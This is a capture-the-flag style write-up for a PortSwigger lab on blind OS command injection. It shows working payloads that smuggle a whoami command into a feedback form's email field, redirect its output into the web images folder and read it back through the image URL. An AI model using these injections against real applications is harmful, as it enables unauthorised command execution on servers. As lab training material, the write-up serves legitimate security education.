# Lab 3 - Blind OS command injection with output redirection

**YouTube video & lab links below:**

[Command Injection - Lab #3 Blind OS command injection with output redirection | Long Version](https://youtu.be/Gf2_UWsYrpM?list=PLuyTk2_mYISK9ywsFZZOT1LuO3Eb7Wq5q)

[Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

```
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. 
The output from the command is not returned in the response. 
However, you can use output redirection to capture the output from the command. 
There is a writable folder at: /var/www/images/

The application serves the images for the product catalog from this location. 
You can redirect the output from the injected command to a file in this folder, 
and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.
```

### Target Goal - Exploit the blind command injection and redirect the output from the whoami command to the `/var/www/images`


#### Analysis:

**1. Confirm blind command injection: Email Field**

**2. Check where images are store**

**3. Redirect output to file**

**4. Check if file was created**

<br>

## Solution:
### The vulnerable parameter is the email field field in the feedback form
at this endpoint: `POST /feedback/submit`

```HTTP
POST /feedback/submit HTTP/2
Host: 0a2f007903dd2e578305105c006200aa.web-security-academy.net
Origin: https://0a2f007903dd2e578305105c006200aa.web-security-academy.net

Referer: https://0a2f007903dd2e578305105c006200aa.web-security-

csrf=sAk5Gg9Qxxvly8VWUAGGuxQyQeYQvzyq&name=Hackerman&email=peter%40normal-user.net&subject=foo&message=bar
```

`&name=Hackerman&`

#### use the same command structure as in the previous lesson
and preceed it with a random letter so that it wont pickup the command, makes it easier
to execute, etc....

```shell
||ping+-c+10+127.0.0.1||
```

But here in this lab it's gonna be:
```shell
x||whoami > /var/www/images/whodatbe.txt||&
```
<br>

### The cmd injection in the email param
```
csrf=xxxxxxxxxJF&name=joe&email=foo@email.com & whoami > /var/www/images/output.txt #&subject=secondattempt&message=foobar
```

Then URL encode it, I used the Decoder tab:
```URL
%78%7c%7c%77%68%6f%61%6d%69%20%3e%20%2f%76%61%72%2f%77%77%77%2f%69%6d%61%67%65%73%2f%77%68%6f%64%61%74%62%65%2e%74%78%74%7c%7c
```

Then the end point containing the .txt file you made is located at:
```HTTP
GET /image?filename=21.jpg
```

It can be any jpg number, that's irrelevant, cause you're gonna change the .jpg file name
to the name of the file you created that contains the output of `whoami` , and that will look like
```HTTP
GET /image?filename=whodatbe.txt HTTP/2
Host: 0a2f007903dd2e578305105c006200aa.web-security-academy.net
```

and the response should be
```HTTP
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Set-Cookie: session=CsuBhNTngZrmPSJAreEo9oFnWjh80WCd; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-WKMu36
```

**And BOOM !**
you are `peter-WKMu36`

--Done--